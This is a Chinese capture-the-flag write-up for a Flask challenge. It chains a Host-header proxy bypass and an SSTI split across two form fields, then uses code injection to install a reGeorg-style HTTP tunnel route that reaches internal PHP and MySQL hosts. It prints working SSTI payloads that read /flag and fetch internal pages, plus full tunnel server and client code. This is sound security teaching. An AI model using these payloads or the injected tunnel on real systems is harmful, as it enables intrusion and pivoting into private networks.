# login_me_again_and_again

## 题目简述

题目是一个 Flask/requests 写成的反向代理加后端登录系统。代理路由把 `POST` 写成 `P0ST`，正常无法经代理提交表单；源码注释暴露了链路为“用户 -> nginx -> 代理 -> nginx -> 真实后端”，因此可通过修改 `Host: nginx` 绕过代理直连后端。后端登录处 username/password 分字段过滤模板语法，可把 `{{` 和 `}}` 分别放入不同字段拼出 SSTI。flag 不在当前 Flask 容器，后续需要通过注入 Flask 路由实现 reGeorg 隧道访问内网 `php` / `mysql` 服务，并处理 MySQL SSL 登录。

## 解题过程

访问题目时登录报错。

页面提示：

```text
Oops, error occurred! Maybe you can read the source code and fix the bug for me?!
```

查看源码可以看到代理使用 Flask 和 requests 实现，但 `proxy` 路由的 methods 写成了 `P0ST` 而不是 `POST`，所以不能直接经代理提交 POST 请求。

源码注释说明真实后端也在 nginx 后面。把请求 Host 改成 `nginx` 后，可以绕过代理直接访问真实后端。

登录表单存在 SSTI。过滤逻辑分别检查 username 和 password，导致 `{{` 和 `}}` 不能同时出现在同一个字段中，但可以让 username 提供开头、password 提供结尾，从两个字段拼出模板表达式。非预期做法是只用 `{%` / `%}` 绕过。

先用模板全局对象读取当前容器的 `/flag`：

```plain
username={{url_for.__globals__['__builtins__']['eval']("open('/flag').read()#&password=")}}
```

回显说明 flag 不在当前容器。

结果表明 flag 不在当前机器，并且容器不能访问公网，于是用 `requests` 从内网 `php` 主机读取源码：

```plain
username={{url_for.__globals__['__builtins__']['eval'](request.form['a']%2b"#&password=")}}&a=__import__("base64").b64encode(__import__("requests").get("http://php/?source").text.encode())
```

`php` 登录需要 `mysql` 主机上的 MySQL 密码，用户名固定为 `admin`。MySQL 连接需要登录和 SSL，不能简单重放流量。

这里使用 reGeorg 思路。reGeorg 的关键机制是把 HTTP 请求封装成 SOCKS 隧道：客户端发送 `X-CMD: CONNECT/READ/FORWARD/DISCONNECT` 等头，服务端在目标网络中建立 socket 并把数据通过 HTTP body 转发回来。本题中只有 Flask 可控，因此把 reGeorg 的服务端逻辑改写成动态 Flask route，通过 SSTI 注入到当前应用中。

核心服务端路由如下，必须自包含导入 `request/make_response/socket` 等依赖，并把 socket 保存在可达的全局状态中：

```python
from flask import current_app as app
import sys

sys.tunnels = {}
sys.currentTunnelId = 0

@app.route("/proxy", methods=["GET", "POST"])
def tunnel():
    from flask import request, make_response
    import socket
    import errno
    import sys

    tunnels = sys.tunnels
    currentTunnelId = sys.currentTunnelId

    def make_resp(text, headers):
        resp = make_response(text)
        for key, value in headers.items():
            resp.headers[key] = value
        return resp

    if request.method == "GET":
        return "Georg says, 'All seems fine'"
    if request.method != "POST":
        return "?"

    resp_headers = {"X-STATUS": "OK"}
    cmd = request.headers.get("X-CMD")
    tid = int(request.cookies.get("tunnelid", -1))

    if cmd == "CONNECT":
        target = request.headers["X-TARGET"]
        port = int(request.headers["X-PORT"])
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.setblocking(0)
        tunnels[currentTunnelId] = sock
        resp = make_resp("", resp_headers)
        resp.set_cookie("tunnelid", str(currentTunnelId))
        sys.currentTunnelId += 1
        return resp

    if cmd == "READ":
        sock = tunnels[tid]
        buf = b""
        try:
            chunk = sock.recv(1024)
            while chunk:
                buf += chunk
                chunk = sock.recv(1024)
        except socket.error as e:
            if e.args[0] not in (errno.EAGAIN, errno.EWOULDBLOCK):
                raise
        return make_resp(buf, resp_headers)

    if cmd == "FORWARD":
        sock = tunnels[tid]
        data = request.stream.read(int(request.headers["Content-Length"]))
        sock.send(data)
        return make_resp("", resp_headers)

    if cmd == "DISCONNECT":
        try:
            tunnels[tid].close()
            del tunnels[tid]
        except Exception:
            pass
        resp = make_resp("", resp_headers)
        resp.set_cookie("tunnelid", "-1")
        return resp
```

注入时需要 urlencode 编码，通过 SSTI 执行 `exec` 而不是 `eval`，注入成功后会新增 `/proxy` 路由。

```plain
注意：这里执行的是多行路由注册代码，需要用 exec，而不是 eval。
```

返回 `Username: None` 表示代码执行成功且没有报错。客户端侧也要改 reGeorg：每个 `headers={}` 中添加 `"Host": "nginx"`，并把建立连接处的 `conn.urlopen(...)` 改成可显式传 Host 头的 `conn.request(...)`，否则原版客户端无法稳定修改 Host。

```python
headers = {
    "Host": "nginx",
    "X-CMD": "CONNECT",
    "X-TARGET": target,
    "X-PORT": port,
}
response = conn.request("POST", self.httpPath, "", headers)
```

随后使用 reGeorg 建立隧道，连接 MySQL 时传递 `--ssl=1`，获取 PHP 登录所需的 MySQL 密码。

登录 MySQL 后从 `login.logins` 表读取 PHP 登录密码，再提交给 PHP 登录页。

提交密码后得到 flag。

### 非预期

题目原本删除了 Python 的 `ssl.py`，但没有删除底层 `_ssl` 模块。由于删除 `_ssl` 需要重新编译 Python 并禁用 ssl 模块，选手仍可自己实现 `ssl.py` 的功能，在 Python 中构造支持 SSL 的 MySQL 客户端。

## 方法总结

- 核心技巧：Host 头绕过反向代理、分字段 SSTI 拼接、SSTI 动态注册 Flask 路由、reGeorg HTTP 隧道访问内网 MySQL。
- 识别信号：代理源码注释暴露内网 host、路由 method 拼写异常、模板过滤按字段分别处理、flag 不在当前容器且存在内网服务依赖时，应考虑从 SSTI 扩展到内网隧道。
- 复用要点：外链 reGeorg 的关键不是仓库地址本身，而是 `CONNECT/READ/FORWARD/DISCONNECT` 的 HTTP 隧道协议；长期 WP 中应保留服务端路由核心和客户端 Host 头改动，避免只写“使用 reGeorg”。
